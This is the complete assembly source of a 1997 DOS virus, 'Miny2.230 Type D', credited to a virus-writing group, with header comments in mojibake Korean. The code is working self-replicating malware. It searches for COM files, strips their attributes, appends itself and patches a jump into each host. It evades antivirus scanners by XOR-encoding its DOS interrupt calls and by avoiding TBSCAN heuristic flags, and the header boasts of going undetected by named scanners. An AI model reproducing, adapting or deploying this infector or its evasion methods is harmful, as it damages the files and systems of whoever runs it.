;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
;                                                               CVC #02  97/09
; Virus Name : Miny2.230 Type D
; Author : Osiris
; Group : CVC
; Date : 1997/08/20
;
; Type : Non-resident COM infector
;
; Miny2 (Type C) �� �����e���a.
;
; TBSCAN �� �������w (ҕ~) �A ���a ���e�� �e�E�a. �e�� 62���� �e�i�� �����A 'T'
; �i���a�e �w���e�a. �a�A �����A�� �g�� �a���e �����i�A��e �񬂷� ���a�e�E�a.
; �e, �������w�񬂵A�e ���e�� �E�a. ���� �a�q ���A�� Ё�i�i �������a.
;
; �����A��e TBSCAN �A�� Howard �� ���e�A�� ���A���
; TBSCAN �� �������w�A �韡�� ���A�a Ё�i�A���a.
;
; TBSCAN �� F �i���a '�����a�ᶅ �a�� ��A�a' ������ ���A�e
; �a�� �ŝe ��˥�i�i XOR �� �qѡ�� ���a�� �a�� ѡ�a�A �e�i���a.
; �a����e �b ���w�A 50h �� XOR �e�e�i ���a�� ѡЖ�a.
;
; AVP 970812,DSAV 7.73,F-PROT 2.72a,PCSCAN 315,SCAN 9708,TBAV 8.02,V3 : ���e x
;
; �a��ӡ ���A�񷡜a�e �e���� COM �q�q�� (�q�q�����a��) EXE �w���� COM �a���i �e
; �v�i���� �q�q�������a. ���� ���e�i 62���� �e�i�a�� �a�q�A�e �a�� ɷ���e�a.
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
            .MODEL  TINY
            .CODE

 Miny2:     nop                         ; �a�A���t (�a������ �e�e�a.)
            nop                         ; �|���� ������ �a����a�a �a�A�A��
            nop                         ; �����A �� �t�i �����a.
 start:
            call  Next                  ;
 Next:      pop   bp                    ;
            nop                         ; nop �i ���១�e 'Howard' �� ���e
            sub   bp,offset Next        ; BP = �a����a ���b����

            lea   si,COM_head[BP]       ; COM �|���� ����
            mov   di,0FFh               ; DI �i 100h �� �s�a �១�e
            inc   di                    ;
            push  di                    ; TBSCAN �A�� 'O' �wȁ�a �i���e�a.
            movsw                       ;
            movsb                       ;

            mov   cx,0080h              ; DTA �� �a�wЁ PSP �a �a�A�A�a��
            mov   si,0080h              ; �q�� ��w�e�a.
            lea   di,End_Virus[BP]      ;
            repz  movsb                 ;

            mov   ah,(4Eh xor 50h)      ; �a�� �x��
            mov   cx,00100011B
            lea   dx,Match_COM[BP]
 Find:      call  Int21
            jnc   ChkInfected           ;
 Restart:
            lea   si,End_Virus[BP]      ; ���� DTA ����
            mov   di,0080h
            mov   cx,0080h
            repz  movsb
            RET

 ChkInfected:                           ; �q�q �a���i �·��e�a.
            mov   al,DS:[0096h]         ; 62 �� ���� ��a�e�a.
            and   al,1Fh
            cmp   al,1Fh
            jnz   Infect
            mov   ah,(4Fh xor 50h)      ; �a�q �a�� �x��
            jmp   Find
 Infect:
            mov   ah,(43h XOR 50h)
            mov   al,01h                ; ����/�a�� �����a�� �a��
            xor   cx,cx
            mov   dx,009Eh
            call  Int21
            jc    Restart               ; �A�ᯡ �a�� �h��

            mov   ah,(3Dh xor 50h)
            mov   al,02h                ; �a�� ���e
            call  Int21
            jc    Restart

            xchg  ax,bx                 ; �a�� Ѕ�i �苡

            mov   al,00
            mov   ah,(57h XOR 50h)      ; �a�� �b�� ���e �苡
            call  Int21
            push  cx                    ; �b�� ���e ��w
            push  dx                    ;

            mov   ah,(3Fh XOR 50h)      ; �|���� ����
            lea   dx,COM_Head[BP]       ; ���� ����
            mov   cx,0003               ; 3 �a���a
            call  Int21
            cmp   byte ptr COM_Head[BP],'M' ; MZ ���a ?
            jnz   lseek2
            cmp   byte ptr COM_Head[BP+1],'Z'
            jz    Error
 lseek2:
            mov   al,02                 ; �a�� �{�a�� ����
            call  lseek
            or    dx,dx                 ; 64 KB ���w���a ?
            jnz   Error                 ; �a�q ��a�� ���e ��ǡ�� �g����Ё��

            sub   ax,3                  ; ���a�t ���e
            mov   word ptr JumpCode[BP+1],ax     ;

            mov   ah,(40h XOR 50h)      ; �a����a �a��
            mov   cx,offset End_virus - 3 - 2
            lea   dx,start[BP]
            call  int21

            mov   al,00                 ; ��q�a�� ����
            call  lseek

            mov   ah,(40h xor 50h)      ; ���a š�a �a��
            mov   cx,0003
            lea   dx,JumpCode[BP]
            call  int21

 Error:
            pop   dx                    ; �a�� �b�� ���e ����
            pop   cx                    ;
            or    cx,+1Fh               ; 62 ���� �e�i��
            mov   ah,(57h XOR 50h)
            mov   al,01h              ;
            call  Int21

 Close:
            mov   ah,(3Eh XOR 50h)      ; �a�� �h��
            call  Int21
            jmp   Restart

 lseek:                                 ;
            xor   cx,cx
            xor   dx,dx
            mov   ah,40h
            inc   ah
            inc   ah
            int   21h
            ret

 Int21:                                 ; XOR 50h �e�eҁ
            xor   ah,50h                ; ������a 21h ѡ
            int   21h
            ret

 COM_head   db    0CDh,20h,90h          ; COM �|����
 Match_COM  db    '*.c?m',00            ; COM �a�� �x��
            db    'Miny2'               ; ���� 2
 JumpCode   db    0E9h
            db    ?,?
 End_Virus:
            END   Miny2

